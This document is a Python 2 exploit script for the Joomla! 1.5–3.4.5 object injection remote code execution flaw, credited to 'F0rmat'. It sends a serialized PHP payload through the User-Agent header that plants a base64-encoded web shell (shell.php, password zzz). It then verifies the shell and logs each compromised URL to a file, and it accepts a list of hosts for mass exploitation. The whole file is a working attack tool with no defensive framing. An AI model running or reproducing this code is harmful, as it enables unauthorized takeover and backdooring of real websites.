#coding:utf-8
'''
author:F0rmat
vul:Joomla! 1.5 < 3.4.5 - Object Injection Remote Command Execution
'''
import requests
from optparse import OptionParser


def get_url(url, user_agent):
    headers = {
        'User-Agent': user_agent
    }
    cookies = requests.get(url, headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, headers=headers, cookies=cookies)
    return response.content


def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))

    return encoded[:-1]


def generate_payload(php_payload):
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))

    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

    return exploit_template


def check(url):
    response = requests.get(url)
    return response.content


def exploit(Host):
    turl = Host
    syscmd = "file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']).'/shell.php',base64_decode('dnZ2PD9waHAgZXZhbCgkX1BPU1Rbenp6XSk7Pz4='));"
    pl = generate_payload(syscmd)
    try:
        get_url(turl, pl)
        url = turl + 'shell.php'
        if 'vvv' in check(url):
            print u"成功!shell为" + turl + u"shell.php，密码为zzz"
            with open("success.txt", "a+") as f:
                f.write(url + '  pass:zzz' + "\n")
        else:
            print turl+u"失败！漏洞已修补或版本不同！"
    except:
        print turl+u"失败！漏洞已修补或版本不同！"



def main():
    parser = OptionParser('usage %prog -H <target host> -f <target file>')
    parser.add_option("-H", dest="host",type="string",help="target host e:http://xxx.com/")
    parser.add_option("-f", dest="file",type="string",help="target file ")
    (options, args) = parser.parse_args()
    Host = options.host
    file = options.file
    if (Host == None):
        if(file == None):
            print parser.usage
            exit(0)
        else:
            with open(file,'r') as tfile:
                for fhost in tfile.readlines():
                    fhost=fhost.rstrip("\n")
                    exploit(fhost)
    else:
        exploit(Host)
if __name__ == '__main__':
    main()
